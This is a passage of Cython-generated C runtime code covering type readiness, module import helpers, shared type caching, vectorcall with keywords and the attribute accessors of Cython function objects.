        {
            PyErr_Format(PyExc_TypeError, "base class '%.200s' is an old-style class",
                         PyString_AS_STRING(((PyClassObject*)b0)->cl_name));
#if CYTHON_AVOID_BORROWED_REFS
            Py_DECREF(b0);
#endif
            return -1;
        }
#endif
        b = (PyTypeObject*) b0;
        if (!__Pyx_PyType_HasFeature(b, Py_TPFLAGS_HEAPTYPE))
        {
            __Pyx_TypeName b_name = __Pyx_PyType_GetName(b);
            PyErr_Format(PyExc_TypeError,
                "base class '" __Pyx_FMT_TYPENAME "' is not a heap type", b_name);
            __Pyx_DECREF_TypeName(b_name);
#if CYTHON_AVOID_BORROWED_REFS
            Py_DECREF(b0);
#endif
            return -1;
        }
        if (dictoffset == 0)
        {
            Py_ssize_t b_dictoffset = 0;
#if CYTHON_USE_TYPE_SLOTS || CYTHON_COMPILING_IN_PYPY
            b_dictoffset = b->tp_dictoffset;
#else
            PyObject *py_b_dictoffset = PyObject_GetAttrString((PyObject*)b, "__dictoffset__");
            if (!py_b_dictoffset) goto dictoffset_return;
            b_dictoffset = PyLong_AsSsize_t(py_b_dictoffset);
            Py_DECREF(py_b_dictoffset);
            if (b_dictoffset == -1 && PyErr_Occurred()) goto dictoffset_return;
#endif
            if (b_dictoffset) {
                {
                    __Pyx_TypeName b_name = __Pyx_PyType_GetName(b);
                    PyErr_Format(PyExc_TypeError,
                        "extension type '%.200s' has no __dict__ slot, "
                        "but base type '" __Pyx_FMT_TYPENAME "' has: "
                        "either add 'cdef dict __dict__' to the extension type "
                        "or add '__slots__ = [...]' to the base type",
                        type_name, b_name);
                    __Pyx_DECREF_TypeName(b_name);
                }
#if !(CYTHON_USE_TYPE_SLOTS || CYTHON_COMPILING_IN_PYPY)
              dictoffset_return:
#endif
#if CYTHON_AVOID_BORROWED_REFS
                Py_DECREF(b0);
#endif
                return -1;
            }
        }
#if CYTHON_AVOID_BORROWED_REFS
        Py_DECREF(b0);
#endif
    }
    return 0;
}
#endif

/* PyType_Ready */
static int __Pyx_PyType_Ready(PyTypeObject *t) {
#if CYTHON_USE_TYPE_SPECS || !(CYTHON_COMPILING_IN_CPYTHON || CYTHON_COMPILING_IN_LIMITED_API) || defined(PYSTON_MAJOR_VERSION)
    (void)__Pyx_PyObject_CallMethod0;
#if CYTHON_USE_TYPE_SPECS
    (void)__Pyx_validate_bases_tuple;
#endif
    return PyType_Ready(t);
#else
    int r;
    PyObject *bases = __Pyx_PyType_GetSlot(t, tp_bases, PyObject*);
    if (bases && unlikely(__Pyx_validate_bases_tuple(t->tp_name, t->tp_dictoffset, bases) == -1))
        return -1;
#if PY_VERSION_HEX >= 0x03050000 && !defined(PYSTON_MAJOR_VERSION)
    {
        int gc_was_enabled;
    #if PY_VERSION_HEX >= 0x030A00b1
        gc_was_enabled = PyGC_Disable();
        (void)__Pyx_PyObject_CallMethod0;
    #else
        PyObject *ret, *py_status;
        PyObject *gc = NULL;
        #if PY_VERSION_HEX >= 0x030700a1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM+0 >= 0x07030400)
        gc = PyImport_GetModule(__pyx_kp_u_gc);
        #endif
        if (unlikely(!gc)) gc = PyImport_Import(__pyx_kp_u_gc);
        if (unlikely(!gc)) return -1;
        py_status = __Pyx_PyObject_CallMethod0(gc, __pyx_kp_u_isenabled);
        if (unlikely(!py_status)) {
            Py_DECREF(gc);
            return -1;
        }
        gc_was_enabled = __Pyx_PyObject_IsTrue(py_status);
        Py_DECREF(py_status);
        if (gc_was_enabled > 0) {
            ret = __Pyx_PyObject_CallMethod0(gc, __pyx_kp_u_disable);
            if (unlikely(!ret)) {
                Py_DECREF(gc);
                return -1;
            }
            Py_DECREF(ret);
        } else if (unlikely(gc_was_enabled == -1)) {
            Py_DECREF(gc);
            return -1;
        }
    #endif
        t->tp_flags |= Py_TPFLAGS_HEAPTYPE;
#if PY_VERSION_HEX >= 0x030A0000
        t->tp_flags |= Py_TPFLAGS_IMMUTABLETYPE;
#endif
#else
        (void)__Pyx_PyObject_CallMethod0;
#endif
    r = PyType_Ready(t);
#if PY_VERSION_HEX >= 0x03050000 && !defined(PYSTON_MAJOR_VERSION)
        t->tp_flags &= ~Py_TPFLAGS_HEAPTYPE;
    #if PY_VERSION_HEX >= 0x030A00b1
        if (gc_was_enabled)
            PyGC_Enable();
    #else
        if (gc_was_enabled) {
            PyObject *tp, *v, *tb;
            PyErr_Fetch(&tp, &v, &tb);
            ret = __Pyx_PyObject_CallMethod0(gc, __pyx_kp_u_enable);
            if (likely(ret || r == -1)) {
                Py_XDECREF(ret);
                PyErr_Restore(tp, v, tb);
            } else {
                Py_XDECREF(tp);
                Py_XDECREF(v);
                Py_XDECREF(tb);
                r = -1;
            }
        }
        Py_DECREF(gc);
    #endif
    }
#endif
    return r;
#endif
}

/* PyObject_GenericGetAttrNoDict */
#if CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP && PY_VERSION_HEX < 0x03070000
static PyObject *__Pyx_RaiseGenericGetAttributeError(PyTypeObject *tp, PyObject *attr_name) {
    __Pyx_TypeName type_name = __Pyx_PyType_GetName(tp);
    PyErr_Format(PyExc_AttributeError,
#if PY_MAJOR_VERSION >= 3
                 "'" __Pyx_FMT_TYPENAME "' object has no attribute '%U'",
                 type_name, attr_name);
#else
                 "'" __Pyx_FMT_TYPENAME "' object has no attribute '%.400s'",
                 type_name, PyString_AS_STRING(attr_name));
#endif
    __Pyx_DECREF_TypeName(type_name);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_GenericGetAttrNoDict(PyObject* obj, PyObject* attr_name) {
    PyObject *descr;
    PyTypeObject *tp = Py_TYPE(obj);
    if (unlikely(!PyString_Check(attr_name))) {
        return PyObject_GenericGetAttr(obj, attr_name);
    }
    assert(!tp->tp_dictoffset);
    descr = _PyType_Lookup(tp, attr_name);
    if (unlikely(!descr)) {
        return __Pyx_RaiseGenericGetAttributeError(tp, attr_name);
    }
    Py_INCREF(descr);
    #if PY_MAJOR_VERSION < 3
    if (likely(PyType_HasFeature(Py_TYPE(descr), Py_TPFLAGS_HAVE_CLASS)))
    #endif
    {
        descrgetfunc f = Py_TYPE(descr)->tp_descr_get;
        if (unlikely(f)) {
            PyObject *res = f(descr, obj, (PyObject *)tp);
            Py_DECREF(descr);
            return res;
        }
    }
    return descr;
}
#endif

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *module = 0;
    PyObject *empty_dict = 0;
    PyObject *empty_list = 0;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (unlikely(!py_import))
        goto bad;
    if (!from_list) {
        empty_list = PyList_New(0);
        if (unlikely(!empty_list))
            goto bad;
        from_list = empty_list;
    }
    #endif
    empty_dict = PyDict_New();
    if (unlikely(!empty_dict))
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if (strchr(__Pyx_MODULE_NAME, '.') != NULL) {
                module = PyImport_ImportModuleLevelObject(
                    name, __pyx_d, empty_dict, from_list, 1);
                if (unlikely(!module)) {
                    if (unlikely(!PyErr_ExceptionMatches(PyExc_ImportError)))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (unlikely(!py_level))
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, __pyx_d, empty_dict, from_list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, __pyx_d, empty_dict, from_list, level);
            #endif
        }
    }
bad:
    Py_XDECREF(empty_dict);
    Py_XDECREF(empty_list);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    return module;
}

/* ImportFrom */
static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name) {
    PyObject* value = __Pyx_PyObject_GetAttrStr(module, name);
    if (unlikely(!value) && PyErr_ExceptionMatches(PyExc_AttributeError)) {
        const char* module_name_str = 0;
        PyObject* module_name = 0;
        PyObject* module_dot = 0;
        PyObject* full_name = 0;
        PyErr_Clear();
        module_name_str = PyModule_GetName(module);
        if (unlikely(!module_name_str)) { goto modbad; }
        module_name = PyUnicode_FromString(module_name_str);
        if (unlikely(!module_name)) { goto modbad; }
        module_dot = PyUnicode_Concat(module_name, __pyx_kp_u__11);
        if (unlikely(!module_dot)) { goto modbad; }
        full_name = PyUnicode_Concat(module_dot, name);
        if (unlikely(!full_name)) { goto modbad; }
        #if PY_VERSION_HEX < 0x030700A1 || (CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM  < 0x07030400)
        {
            PyObject *modules = PyImport_GetModuleDict();
            if (unlikely(!modules))
                goto modbad;
            value = PyObject_GetItem(modules, full_name);
        }
        #else
        value = PyImport_GetModule(full_name);
        #endif
      modbad:
        Py_XDECREF(full_name);
        Py_XDECREF(module_dot);
        Py_XDECREF(module_name);
    }
    if (unlikely(!value)) {
        PyErr_Format(PyExc_ImportError,
        #if PY_MAJOR_VERSION < 3
            "cannot import name %.230s", PyString_AS_STRING(name));
        #else
            "cannot import name %S", name);
        #endif
    }
    return value;
}

/* ImportDottedModule */
#if PY_MAJOR_VERSION >= 3
static PyObject *__Pyx__ImportDottedModule_Error(PyObject *name, PyObject *parts_tuple, Py_ssize_t count) {
    PyObject *partial_name = NULL, *slice = NULL, *sep = NULL;
    if (unlikely(PyErr_Occurred())) {
        PyErr_Clear();
    }
    if (likely(PyTuple_GET_SIZE(parts_tuple) == count)) {
        partial_name = name;
    } else {
        slice = PySequence_GetSlice(parts_tuple, 0, count);
        if (unlikely(!slice))
            goto bad;
        sep = PyUnicode_FromStringAndSize(".", 1);
        if (unlikely(!sep))
            goto bad;
        partial_name = PyUnicode_Join(sep, slice);
    }
    PyErr_Format(
#if PY_MAJOR_VERSION < 3
        PyExc_ImportError,
        "No module named '%s'", PyString_AS_STRING(partial_name));
#else
#if PY_VERSION_HEX >= 0x030600B1
        PyExc_ModuleNotFoundError,
#else
        PyExc_ImportError,
#endif
        "No module named '%U'", partial_name);
#endif
bad:
    Py_XDECREF(sep);
    Py_XDECREF(slice);
    Py_XDECREF(partial_name);
    return NULL;
}
#endif
#if PY_MAJOR_VERSION >= 3
static PyObject *__Pyx__ImportDottedModule_Lookup(PyObject *name) {
    PyObject *imported_module;
#if PY_VERSION_HEX < 0x030700A1 || (CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM  < 0x07030400)
    PyObject *modules = PyImport_GetModuleDict();
    if (unlikely(!modules))
        return NULL;
    imported_module = __Pyx_PyDict_GetItemStr(modules, name);
    Py_XINCREF(imported_module);
#else
    imported_module = PyImport_GetModule(name);
#endif
    return imported_module;
}
#endif
#if PY_MAJOR_VERSION >= 3
static PyObject *__Pyx_ImportDottedModule_WalkParts(PyObject *module, PyObject *name, PyObject *parts_tuple) {
    Py_ssize_t i, nparts;
    nparts = PyTuple_GET_SIZE(parts_tuple);
    for (i=1; i < nparts && module; i++) {
        PyObject *part, *submodule;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        part = PyTuple_GET_ITEM(parts_tuple, i);
#else
        part = PySequence_ITEM(parts_tuple, i);
#endif
        submodule = __Pyx_PyObject_GetAttrStrNoError(module, part);
#if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)
        Py_DECREF(part);
#endif
        Py_DECREF(module);
        module = submodule;
    }
    if (unlikely(!module)) {
        return __Pyx__ImportDottedModule_Error(name, parts_tuple, i);
    }
    return module;
}
#endif
static PyObject *__Pyx__ImportDottedModule(PyObject *name, PyObject *parts_tuple) {
#if PY_MAJOR_VERSION < 3
    PyObject *module, *from_list, *star = __pyx_n_s__93;
    CYTHON_UNUSED_VAR(parts_tuple);
    from_list = PyList_New(1);
    if (unlikely(!from_list))
        return NULL;
    Py_INCREF(star);
    PyList_SET_ITEM(from_list, 0, star);
    module = __Pyx_Import(name, from_list, 0);
    Py_DECREF(from_list);
    return module;
#else
    PyObject *imported_module;
    PyObject *module = __Pyx_Import(name, NULL, 0);
    if (!parts_tuple || unlikely(!module))
        return module;
    imported_module = __Pyx__ImportDottedModule_Lookup(name);
    if (likely(imported_module)) {
        Py_DECREF(module);
        return imported_module;
    }
    PyErr_Clear();
    return __Pyx_ImportDottedModule_WalkParts(module, name, parts_tuple);
#endif
}
static PyObject *__Pyx_ImportDottedModule(PyObject *name, PyObject *parts_tuple) {
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030400B1
    PyObject *module = __Pyx__ImportDottedModule_Lookup(name);
    if (likely(module)) {
        PyObject *spec = __Pyx_PyObject_GetAttrStrNoError(module, __pyx_n_s_spec);
        if (likely(spec)) {
            PyObject *unsafe = __Pyx_PyObject_GetAttrStrNoError(spec, __pyx_n_s_initializing);
            if (likely(!unsafe || !__Pyx_PyObject_IsTrue(unsafe))) {
                Py_DECREF(spec);
                spec = NULL;
            }
            Py_XDECREF(unsafe);
        }
        if (likely(!spec)) {
            PyErr_Clear();
            return module;
        }
        Py_DECREF(spec);
        Py_DECREF(module);
    } else if (PyErr_Occurred()) {
        PyErr_Clear();
    }
#endif
    return __Pyx__ImportDottedModule(name, parts_tuple);
}

/* FetchSharedCythonModule */
static PyObject *__Pyx_FetchSharedCythonABIModule(void) {
    return __Pyx_PyImport_AddModuleRef((char*) __PYX_ABI_MODULE_NAME);
}

/* FetchCommonType */
static int __Pyx_VerifyCachedType(PyObject *cached_type,
                               const char *name,
                               Py_ssize_t basicsize,
                               Py_ssize_t expected_basicsize) {
    if (!PyType_Check(cached_type)) {
        PyErr_Format(PyExc_TypeError,
            "Shared Cython type %.200s is not a type object", name);
        return -1;
    }
    if (basicsize != expected_basicsize) {
        PyErr_Format(PyExc_TypeError,
            "Shared Cython type %.200s has the wrong size, try recompiling",
            name);
        return -1;
    }
    return 0;
}
#if !CYTHON_USE_TYPE_SPECS
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type) {
    PyObject* abi_module;
    const char* object_name;
    PyTypeObject *cached_type = NULL;
    abi_module = __Pyx_FetchSharedCythonABIModule();
    if (!abi_module) return NULL;
    object_name = strrchr(type->tp_name, '.');
    object_name = object_name ? object_name+1 : type->tp_name;
    cached_type = (PyTypeObject*) PyObject_GetAttrString(abi_module, object_name);
    if (cached_type) {
        if (__Pyx_VerifyCachedType(
              (PyObject *)cached_type,
              object_name,
              cached_type->tp_basicsize,
              type->tp_basicsize) < 0) {
            goto bad;
        }
        goto done;
    }
    if (!PyErr_ExceptionMatches(PyExc_AttributeError)) goto bad;
    PyErr_Clear();
    if (PyType_Ready(type) < 0) goto bad;
    if (PyObject_SetAttrString(abi_module, object_name, (PyObject *)type) < 0)
        goto bad;
    Py_INCREF(type);
    cached_type = type;
done:
    Py_DECREF(abi_module);
    return cached_type;
bad:
    Py_XDECREF(cached_type);
    cached_type = NULL;
    goto done;
}
#else
static PyTypeObject *__Pyx_FetchCommonTypeFromSpec(PyObject *module, PyType_Spec *spec, PyObject *bases) {
    PyObject *abi_module, *cached_type = NULL;
    const char* object_name = strrchr(spec->name, '.');
    object_name = object_name ? object_name+1 : spec->name;
    abi_module = __Pyx_FetchSharedCythonABIModule();
    if (!abi_module) return NULL;
    cached_type = PyObject_GetAttrString(abi_module, object_name);
    if (cached_type) {
        Py_ssize_t basicsize;
#if CYTHON_COMPILING_IN_LIMITED_API
        PyObject *py_basicsize;
        py_basicsize = PyObject_GetAttrString(cached_type, "__basicsize__");
        if (unlikely(!py_basicsize)) goto bad;
        basicsize = PyLong_AsSsize_t(py_basicsize);
        Py_DECREF(py_basicsize);
        py_basicsize = 0;
        if (unlikely(basicsize == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
#else
        basicsize = likely(PyType_Check(cached_type)) ? ((PyTypeObject*) cached_type)->tp_basicsize : -1;
#endif
        if (__Pyx_VerifyCachedType(
              cached_type,
              object_name,
              basicsize,
              spec->basicsize) < 0) {
            goto bad;
        }
        goto done;
    }
    if (!PyErr_ExceptionMatches(PyExc_AttributeError)) goto bad;
    PyErr_Clear();
    CYTHON_UNUSED_VAR(module);
    cached_type = __Pyx_PyType_FromModuleAndSpec(abi_module, spec, bases);
    if (unlikely(!cached_type)) goto bad;
    if (unlikely(__Pyx_fix_up_extension_type_from_spec(spec, (PyTypeObject *) cached_type) < 0)) goto bad;
    if (PyObject_SetAttrString(abi_module, object_name, cached_type) < 0) goto bad;
done:
    Py_DECREF(abi_module);
    assert(cached_type == NULL || PyType_Check(cached_type));
    return (PyTypeObject *) cached_type;
bad:
    Py_XDECREF(cached_type);
    cached_type = NULL;
    goto done;
}
#endif

/* PyVectorcallFastCallDict */
#if CYTHON_METH_FASTCALL
static PyObject *__Pyx_PyVectorcall_FastCallDict_kw(PyObject *func, __pyx_vectorcallfunc vc, PyObject *const *args, size_t nargs, PyObject *kw)
{
    PyObject *res = NULL;
    PyObject *kwnames;
    PyObject **newargs;
    PyObject **kwvalues;
    Py_ssize_t i, pos;
    size_t j;
    PyObject *key, *value;
    unsigned long keys_are_strings;
    Py_ssize_t nkw = PyDict_GET_SIZE(kw);
    newargs = (PyObject **)PyMem_Malloc((nargs + (size_t)nkw) * sizeof(args[0]));
    if (unlikely(newargs == NULL)) {
        PyErr_NoMemory();
        return NULL;
    }
    for (j = 0; j < nargs; j++) newargs[j] = args[j];
    kwnames = PyTuple_New(nkw);
    if (unlikely(kwnames == NULL)) {
        PyMem_Free(newargs);
        return NULL;
    }
    kwvalues = newargs + nargs;
    pos = i = 0;
    keys_are_strings = Py_TPFLAGS_UNICODE_SUBCLASS;
    while (PyDict_Next(kw, &pos, &key, &value)) {
        keys_are_strings &= Py_TYPE(key)->tp_flags;
        Py_INCREF(key);
        Py_INCREF(value);
        PyTuple_SET_ITEM(kwnames, i, key);
        kwvalues[i] = value;
        i++;
    }
    if (unlikely(!keys_are_strings)) {
        PyErr_SetString(PyExc_TypeError, "keywords must be strings");
        goto cleanup;
    }
    res = vc(func, newargs, nargs, kwnames);
cleanup:
    Py_DECREF(kwnames);
    for (i = 0; i < nkw; i++)
        Py_DECREF(kwvalues[i]);
    PyMem_Free(newargs);
    return res;
}
static CYTHON_INLINE PyObject *__Pyx_PyVectorcall_FastCallDict(PyObject *func, __pyx_vectorcallfunc vc, PyObject *const *args, size_t nargs, PyObject *kw)
{
    if (likely(kw == NULL) || PyDict_GET_SIZE(kw) == 0) {
        return vc(func, args, nargs, NULL);
    }
    return __Pyx_PyVectorcall_FastCallDict_kw(func, vc, args, nargs, kw);
}
#endif

/* CythonFunctionShared */
#if CYTHON_COMPILING_IN_LIMITED_API
static CYTHON_INLINE int __Pyx__IsSameCyOrCFunction(PyObject *func, void *cfunc) {
    if (__Pyx_CyFunction_Check(func)) {
        return PyCFunction_GetFunction(((__pyx_CyFunctionObject*)func)->func) == (PyCFunction) cfunc;
    } else if (PyCFunction_Check(func)) {
        return PyCFunction_GetFunction(func) == (PyCFunction) cfunc;
    }
    return 0;
}
#else
static CYTHON_INLINE int __Pyx__IsSameCyOrCFunction(PyObject *func, void *cfunc) {
    return __Pyx_CyOrPyCFunction_Check(func) && __Pyx_CyOrPyCFunction_GET_FUNCTION(func) == (PyCFunction) cfunc;
}
#endif
static CYTHON_INLINE void __Pyx__CyFunction_SetClassObj(__pyx_CyFunctionObject* f, PyObject* classobj) {
#if PY_VERSION_HEX < 0x030900B1 || CYTHON_COMPILING_IN_LIMITED_API
    __Pyx_Py_XDECREF_SET(
        __Pyx_CyFunction_GetClassObj(f),
            ((classobj) ? __Pyx_NewRef(classobj) : NULL));
#else
    __Pyx_Py_XDECREF_SET(
        ((PyCMethodObject *) (f))->mm_class,
        (PyTypeObject*)((classobj) ? __Pyx_NewRef(classobj) : NULL));
#endif
}
static PyObject *
__Pyx_CyFunction_get_doc(__pyx_CyFunctionObject *op, void *closure)
{
    CYTHON_UNUSED_VAR(closure);
    if (unlikely(op->func_doc == NULL)) {
#if CYTHON_COMPILING_IN_LIMITED_API
        op->func_doc = PyObject_GetAttrString(op->func, "__doc__");
        if (unlikely(!op->func_doc)) return NULL;
#else
        if (((PyCFunctionObject*)op)->m_ml->ml_doc) {
#if PY_MAJOR_VERSION >= 3
            op->func_doc = PyUnicode_FromString(((PyCFunctionObject*)op)->m_ml->ml_doc);
#else
            op->func_doc = PyString_FromString(((PyCFunctionObject*)op)->m_ml->ml_doc);
#endif
            if (unlikely(op->func_doc == NULL))
                return NULL;
        } else {
            Py_INCREF(Py_None);
            return Py_None;
        }
#endif
    }
    Py_INCREF(op->func_doc);
    return op->func_doc;
}
static int
__Pyx_CyFunction_set_doc(__pyx_CyFunctionObject *op, PyObject *value, void *context)
{
    CYTHON_UNUSED_VAR(context);
    if (value == NULL) {
        value = Py_None;
    }
    Py_INCREF(value);
    __Pyx_Py_XDECREF_SET(op->func_doc, value);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_name(__pyx_CyFunctionObject *op, void *context)
{
    CYTHON_UNUSED_VAR(context);
    if (unlikely(op->func_name == NULL)) {
#if CYTHON_COMPILING_IN_LIMITED_API
        op->func_name = PyObject_GetAttrString(op->func, "__name__");
#elif PY_MAJOR_VERSION >= 3
        op->func_name = PyUnicode_InternFromString(((PyCFunctionObject*)op)->m_ml->ml_name);
#else
        op->func_name = PyString_InternFromString(((PyCFunctionObject*)op)->m_ml->ml_name);
#endif
        if (unlikely(op->func_name == NULL))
            return NULL;
    }
    Py_INCREF(op->func_name);
    return op->func_name;
}
static int
__Pyx_CyFunction_set_name(__pyx_CyFunctionObject *op, PyObject *value, void *context)
{
    CYTHON_UNUSED_VAR(context);
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__name__ must be set to a string object");
        return -1;
    }
    Py_INCREF(value);
    __Pyx_Py_XDECREF_SET(op->func_name, value);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_qualname(__pyx_CyFunctionObject *op, void *context)
{
    CYTHON_UNUSED_VAR(context);
    Py_INCREF(op->func_qualname);
    return op->func_qualname;
}
static int
__Pyx_CyFunction_set_qualname(__pyx_CyFunctionObject *op, PyObject *value, void *context)
{
    CYTHON_UNUSED_VAR(context);
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__qualname__ must be set to a string object");
        return -1;
    }
    Py_INCREF(value);
    __Pyx_Py_XDECREF_SET(op->func_qualname, value);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_dict(__pyx_CyFunctionObject *op, void *context)
{
    CYTHON_UNUSED_VAR(context);
    if (unlikely(op->func_dict == NULL)) {
        op->func_dict = PyDict_New();
        if (unlikely(op->func_dict == NULL))
            return NULL;
    }
    Py_INCREF(op->func_dict);
    return op->func_dict;
}
static int
__Pyx_CyFunction_set_dict(__pyx_CyFunctionObject *op, PyObject *value, void *context)
{
    CYTHON_UNUSED_VAR(context);
    if (unlikely(value == NULL)) {
        PyErr_SetString(PyExc_TypeError,
               "function's dictionary may not be deleted");
        return -1;
    }
    if (unlikely(!PyDict_Check(value))) {
        PyErr_SetString(PyExc_TypeError,
               "setting function's dictionary to a non-dict");
        return -1;
    }
    Py_INCREF(value);
    __Pyx_Py_XDECREF_SET(op->func_dict, value);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_globals(__pyx_CyFunctionObject *op, void *context)
{
    CYTHON_UNUSED_VAR(context);
    Py_INCREF(op->func_globals);
    return op->func_globals;
}
static PyObject *
__Pyx_CyFunction_get_closure(__pyx_CyFunctionObject *op, void *context)
{
    CYTHON_UNUSED_VAR(op);
    CYTHON_UNUSED_VAR(context);
    Py_INCREF(Py_None);
    return Py_None;
}
static PyObject *
__Pyx_CyFunction_get_code(__pyx_CyFunctionObject *op, void *context)
{
    PyObject* result = (op->func_code) ? op->func_code : Py_None;
    CYTHON_UNUSED_VAR(context);
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_init_defaults(__pyx_CyFunctionObject *op) {
    int result = 0;
    PyObject *res = op->defaults_getter((PyObject *) op);
    if (unlikely(!res))
        return -1;
    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    op->defaults_tuple = PyTuple_GET_ITEM(res, 0);
    Py_INCREF(op->defaults_tuple);
    op->defaults_kwdict = PyTuple_GET_ITEM(res, 1);
    Py_INCREF(op->defaults_kwdict);
    #else
    op->defaults_tuple = __Pyx_PySequence_ITEM(res, 0);
    if (unlikely(!op->defaults_tuple)) result = -1;
    else {
        op->defaults_kwdict = __Pyx_PySequence_ITEM(res, 1);
        if (unlikely(!op->defaults_kwdict)) result = -1;
    }
    #endif
    Py_DECREF(res);
    return result;
}
static int
__Pyx_CyFunction_set_defaults(__pyx_CyFunctionObject *op, PyObject* value, void *context) {
    CYTHON_UNUSED_VAR(context);
    if (!value) {
        value = Py_None;
    } else if (unlikely(value != Py_None && !PyTuple_Check(value))) {
        PyErr_SetString(PyExc_TypeError,
                        "__defaults__ must be set to a tuple object");
        return -1;
    }
    PyErr_WarnEx(PyExc_RuntimeWarning, "changes to cyfunction.__defaults__ will not "
                 "currently affect the values used in function calls", 1);
    Py_INCREF(value);
    __Pyx_Py_XDECREF_SET(op->defaults_tuple, value);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_defaults(__pyx_CyFunctionObject *op, void *context) {
    PyObject* result = op->defaults_tuple;
    CYTHON_UNUSED_VAR(context);
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (unlikely(__Pyx_CyFunction_init_defaults(op) < 0)) return NULL;
            result = op->defaults_tuple;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_kwdefaults(__pyx_CyFunctionObject *op, PyObject* value, void *context) {
    CYTHON_UNUSED_VAR(context);
    if (!value) {
        value = Py_None;
    } else if (unlikely(value != Py_None && !PyDict_Check(value))) {
        PyErr_SetString(PyExc_TypeError,
                        "__kwdefaults__ must be set to a dict object");
        return -1;
    }
    PyErr_WarnEx(PyExc_RuntimeWarning, "changes to cyfunction.__kwdefaults__ will not "
                 "currently affect the values used in function calls", 1);
    Py_INCREF(value);
    __Pyx_Py_XDECREF_SET(op->defaults_kwdict, value);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_kwdefaults(__pyx_CyFunctionObject *op, void *context) {
    PyObject* result = op->defaults_kwdict;
    CYTHON_UNUSED_VAR(context);
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (unlikely(__Pyx_CyFunction_init_defaults(op) < 0)) return NULL;
            result = op->defaults_kwdict;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_annotations(__pyx_CyFunctionObject *op, PyObject* value, void *context) {
    CYTHON_UNUSED_VAR(context);
    if (!value || value == Py_None) {
        value = NULL;
    } else if (unlikely(!PyDict_Check(value))) {
        PyErr_SetString(PyExc_TypeError,
                        "__annotations__ must be set to a dict object");
        return -1;
    }
    Py_XINCREF(value);
    __Pyx_Py_XDECREF_SET(op->func_annotations, value);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_annotations(__pyx_CyFunctionObject *op, void *context) {
    PyObject* result = op->func_annotations;
    CYTHON_UNUSED_VAR(context);
    if (unlikely(!result)) {
        result = PyDict_New();
        if (unlikely(!result)) return NULL;
        op->func_annotations = result;
    }
    Py_INCREF(result);
    return result;
}
static PyObject *
__Pyx_CyFunction_get_is_coroutine(__pyx_CyFunctionObject *op, void *context) {
    int is_coroutine;
    CYTHON_UNUSED_VAR(context);
    if (op->func_is_coroutine) {
        return __Pyx_NewRef(op->func_is_coroutine);
    }
    is_coroutine = op->flags & __Pyx_CYFUNCTION_COROUTINE;
#if PY_VERSION_HEX >= 0x03050000
    if (is_coroutine) {
        PyObject *module, *fromlist, *marker = __pyx_n_s_is_coroutine;
        fromlist = PyList_New(1);
        if (unlikely(!fromlist)) return NULL;
        Py_INCREF(marker);
#if CYTHON_ASSUME_SAFE_MACROS
        PyList_SET_ITEM(fromlist, 0, marker);
#else
        if (unlikely(PyList_SetItem(fromlist, 0, marker) < 0)) {
            Py_DECREF(marker);
            Py_DECREF(fromlist);
            return NULL;
        }
#endif
        module = PyImport_ImportModuleLevelObject(__pyx_n_s_asyncio_coroutines, NULL, NULL, fromlist, 0);
        Py_DECREF(fromlist);
        if (unlikely(!module)) goto ignore;
        op->func_is_coroutine = __Pyx_PyObject_GetAttrStr(module, marker);
        Py_DECREF(module);
        if (likely(op->func_is_coroutine)) {
            return __Pyx_NewRef(op->func_is_coroutine);
        }
ignore:
        PyErr_Clear();
    }
#endif
    op->func_is_coroutine = __Pyx_PyBool_FromLong(is_coroutine);
    return __Pyx_NewRef(op->func_is_coroutine);
}
#if CYTHON_COMPILING_IN_LIMITED_API
static PyObject *
__Pyx_CyFunction_get_module(__pyx_CyFunctionObject *op, void *context) {
    CYTHON_UNUSED_VAR(context);
    return PyObject_GetAttrString(op->func, "__module__");
}
static int
__Pyx_CyFunction_set_module(__pyx_CyFunctionObject *op, PyObject* value, void *context) {
    CYTHON_UNUSED_VAR(context);
    return PyObject_SetAttrString(op->func, "__module__", value);
}
#endif
static PyGetSetDef __pyx_CyFunction_getsets[] = {
